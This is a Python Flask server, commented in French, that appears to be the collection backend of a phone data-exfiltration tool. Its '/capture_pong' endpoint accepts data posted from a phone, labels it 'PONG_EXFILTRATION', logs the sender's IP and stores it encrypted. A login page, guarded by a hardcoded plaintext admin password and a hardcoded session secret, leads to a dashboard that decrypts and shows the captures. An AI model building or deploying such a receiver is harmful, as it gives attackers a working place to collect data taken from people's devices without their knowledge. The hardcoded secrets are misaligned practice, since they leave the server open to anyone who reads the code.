from flask import Flask, render_template, request, redirect, url_for, session
import json
import os
from datetime import datetime
from cryptography.fernet import Fernet
from core.crypto_vault import CryptoVault

app = Flask(__name__)
app.secret_key = "CLE_ULTRA_SECRETE_A_CHANGER" # Nécessaire pour les sessions
vault = CryptoVault()  # Initialise le coffre-fort (charge la clé)
LOG_FILE = "logs/captures.json"

ADMIN_CREDENTIALS = {"admin": "WhiteHat2026!"}


def save_secure_capture(new_entry):
    f = Fernet(vault.key)
    
    # 1. Charger l'existant ou créer une liste vide
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                encrypted_content = file.read()
            # Déchiffrement pour modification
            decrypted_content = f.decrypt(encrypted_content)
            data_list = json.loads(decrypted_content)
        except Exception:
            data_list = []  # En cas d'erreur, on repart à zéro
    else:
        data_list = []

    # 2. Ajouter la nouvelle entrée avec un timestamp
    new_entry["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data_list.append(new_entry)

    # 3. Chiffrer et sauvegarder le tout
    updated_json = json.dumps(data_list).encode()
    encrypted_final = f.encrypt(updated_json)
    
    with open(LOG_FILE, "wb") as file:
        file.write(encrypted_final)
    
    print(f"[+] Donnée sécurisée et stockée.")

@app.route('/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        if ADMIN_CREDENTIALS.get(user) == pw:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
    return '''
        <form method="post" style="text-align:center; margin-top:100px;">
            <input type="text" name="username" placeholder="Admin User"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Connexion</button>
        </form>
    '''

@app.route('/')
def dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    try:
        # 1. On lit les données chiffrées
        with open(LOG_FILE, "rb") as f:
            encrypted_data = f.read()

        # 2. Déchiffrement immédiat en mémoire (on ne touche pas au fichier sur le disque)
        fernet = Fernet(vault.key)
        decrypted_data = fernet.decrypt(encrypted_data)

        # 3. Conversion en liste Python pour le template
        captures = json.loads(decrypted_data)
    except Exception as e:
        print(f"Erreur de lecture ou fichier non chiffré : {e}")
        captures = []

    return render_template('index.html', captures=captures)


@app.route('/capture_pong', methods=['POST'])
def capture_pong():
    # Récupération des données du téléphone
    data = request.get_json(silent=True) or {"info": "Données brutes"}
    data["ip_origine"] = request.remote_addr

    # Sauvegarde chiffrée
    save_secure_capture({
        "type": "PONG_EXFILTRATION",
        "contenu": data
    })

    return "", 204


def run_server():
    """Démarre le serveur Flask en mode threadé."""
    app.run(host='127.0.0.1', port=5000, debug=False)